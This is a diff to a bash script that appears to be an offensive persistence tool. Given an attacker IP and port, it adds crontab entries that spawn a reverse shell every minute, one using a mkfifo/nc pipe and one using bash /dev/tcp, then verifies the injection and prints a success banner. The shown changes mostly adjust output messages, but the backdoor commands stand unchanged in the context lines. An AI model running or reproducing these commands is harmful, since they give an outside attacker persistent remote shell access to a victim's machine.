@@ -7,7 +7,6 @@ ENDCOLOR="\e[0m"
 
 $_REQUEST="$_REQUEST"
 
-
 if [ -z $1 ]
 then
 	echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
@@ -21,17 +20,18 @@ then
 fi
 
 
-echo -e "Injecting Code...\n"
+echo -e "\n${YELLOW}[+] 1. CRONTAB${ENDCOLOR}"
+echo -e "Injecting Code..."
 
 { crontab -l; echo "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"; } | crontab - > /dev/null 2>&1
 { crontab -l; echo "* * * * * bash -i >& /dev/tcp/$1/$2 0>&1"; } | crontab - > /dev/null 2>&1
 crontab -l | grep '* * * * * rm /tmp/f;mkfifo /tmp/f;cat' > /dev/null 2>&1
 
+
 a=$(echo $?)
 if [[ $a =~ 0 ]]
 then
-
-echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
+   echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
 printf"${GREEN}                   oOo 
                              oO
                                o
